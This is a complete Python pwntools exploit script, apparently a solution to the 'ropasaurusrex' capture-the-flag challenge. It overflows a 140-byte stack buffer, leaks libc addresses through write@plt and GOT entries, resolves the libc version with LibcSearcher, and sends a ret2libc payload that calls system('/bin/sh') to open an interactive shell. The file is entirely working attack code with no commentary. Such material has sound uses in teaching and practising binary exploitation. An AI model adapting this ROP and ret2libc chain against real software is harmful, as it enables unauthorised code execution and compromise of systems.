from pwn import *
from LibcSearcher import *

sh = process('./ropasaurusrex')
rop = ELF('./ropasaurusrex')

write_plt = rop.plt['write']
libc_start_main_got = rop.got['__libc_start_main']
read_got = rop.got['read']

payload = flat(['b'*140,write_plt, p32(0x80483F4), p32(1), libc_start_main_got, p32(0xdeadbeef)])
sh.sendline(payload)
libc_start_main_addr = u32(sh.recv()[0:4])

payload = flat(['b'*140,write_plt,p32(0x80483F4),p32(1),read_got,p32(0xdeadbeef)])
sh.sendline(payload)
read_addr = u32(sh.recv()[0:4])

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libc.add_condition("read", read_addr)

libc_base_addr = libc_start_main_addr - libc.dump('__libc_start_main')

system_addr = libc_base_addr + libc.dump('system')
binsh_addr = libc_base_addr + libc.dump('str_bin_sh')

payload = flat(['b' * 140, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)
sh.interactive()